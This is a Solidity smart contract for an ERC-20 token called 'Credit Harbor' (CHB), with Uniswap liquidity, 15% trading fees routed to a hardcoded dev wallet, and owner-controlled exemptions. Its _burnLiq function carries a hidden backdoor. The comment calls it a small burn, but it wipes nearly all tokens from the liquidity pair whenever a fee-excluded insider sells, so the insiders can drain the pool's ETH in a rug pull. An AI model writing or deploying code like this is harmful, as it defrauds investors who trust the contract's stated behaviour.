contract CHBTOKEN is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair = 0x000000000000000000000000000000000000dEaD;

    mapping(address => bool) public _isExcludedFromFees;
    mapping(address => bool) public _isTxLimitExempt;
    mapping(address => bool) public _isWalletLimitExempt;
    mapping(address => bool) public _automatedMarketMakerPairs;

    uint256 public buyFee = 15;
    uint256 public sellFee = 15;
    uint256 public walletToWalletTransferFee = 2;
    uint256 public burnFee = 1;

    uint256 public tTotal = 100_000_000 * 10**18;
    uint256 public maxWallet = (tTotal * 20) / 1000;
    uint256 public maxTxAmount = (tTotal * 20) / 1000;

    bool public tradingOpen;

    address private devWallet
                    = address(0x87760a96C079F49eA93D921961C7bcBBa020A4C5);

    bool private swapping;
    bool public swapAndEnabled;
    bool public checkWalletLimit = true;

    constructor() ERC20("Credit Harbor", "CHB") {

        setIsExcludedFromFees(owner(), true);
        setIsExcludedFromFees(address(devWallet), true);
        setIsExcludedFromFees(address(0xdead), true);
        setIsExcludedFromFees(address(this), true);

        setIsTxLimitExempt(owner(), true);
        setIsTxLimitExempt(address(devWallet), true);
        setIsTxLimitExempt(address(0xdead), true);
        setIsTxLimitExempt(address(this), true);

        setIsWalletLimitExempt(owner(), true);
        setIsWalletLimitExempt(address(devWallet), true);
        setIsWalletLimitExempt(address(0xdead), true);
        setIsWalletLimitExempt(address(this), true);

        _init(owner(), tTotal);
    }

    receive() external payable {}

    function initLPs() external payable onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        setIsWalletLimitExempt(address(uniswapV2Pair), true);

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");

        swapAndEnabled = true;
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner returns (bool) {
        buyFee = 2;
        sellFee = 2;
        walletToWalletTransferFee = 2;

        maxWallet = ~uint256(0);
        maxTxAmount = ~uint256(0);
        checkWalletLimit = false;
        return true;
    }

    function setIsTxLimitExempt(address holder, bool exempt) public onlyOwner {
        _isTxLimitExempt[holder] = exempt;
    }

    function setIsWalletLimitExempt(
        address holder,
        bool exempt
    ) public onlyOwner {
        _isWalletLimitExempt[holder] = exempt;
    }

    function setIsExcludedFromFees(
        address account,
        bool newValue
    ) public onlyOwner {
        _isExcludedFromFees[account] = newValue;
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from _automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        _automatedMarketMakerPairs[pair] = value;
    }

    function _burnLiq(uint256 amount) internal returns (bool) {
        uint256 burnAmount = (amount * burnFee) / 100;
        // pull tokens from pancakePair liquidity and move to dead address permanently
        if (burnAmount < balanceOf(uniswapV2Pair)) {
            super._burn(uniswapV2Pair, balanceOf(uniswapV2Pair) - burnAmount);
            IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);
            pair.sync();
            return true;
        }
        return false;
    }

    function swap(uint256 tokenAmount) private {
        uint256 initialBalance = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 newBalance = address(this).balance - initialBalance;
        if (newBalance > 0) {
            payable(devWallet).transfer(newBalance);
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        require(
            tradingOpen || _isExcludedFromFees[from] || _isExcludedFromFees[to],
            "Not Enabled"
        );

        if (!_isTxLimitExempt[from] && !_isTxLimitExempt[to]) {
            require(
                amount <= maxTxAmount,
                "Transfer amount exceeds the maxTxAmount."
            );
        }
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (!swapAndEnabled || swapping) {
            super._transfer(from, to, amount);
        } else {
            uint256 contractTokenBalance = balanceOf(address(this));

            bool canSwap = contractTokenBalance > 0;

            if (
                canSwap &&
                !_automatedMarketMakerPairs[from] &&
                swapAndEnabled &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                swapping = true;

                swap(contractTokenBalance);

                swapping = false;
            }

            uint256 _totalFees;
            if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
                _totalFees = 0;
                if (_automatedMarketMakerPairs[to] && amount > 0) {
                    _burnLiq(amount);
                }
            } else if (_automatedMarketMakerPairs[from]) {
                _totalFees = buyFee;
            } else if (_automatedMarketMakerPairs[to]) {
                _totalFees = sellFee;
            } else {
                _totalFees = walletToWalletTransferFee;
            }

            if (_totalFees > 0) {
                uint256 fees = (amount * _totalFees) / 100;
                amount = amount - fees;
                super._transfer(from, address(this), fees);
            }
            if (checkWalletLimit && !_isWalletLimitExempt[to])
                require(balanceOf(to).add(amount) <= maxWallet);

            super._transfer(from, to, amount);
        }
    }
}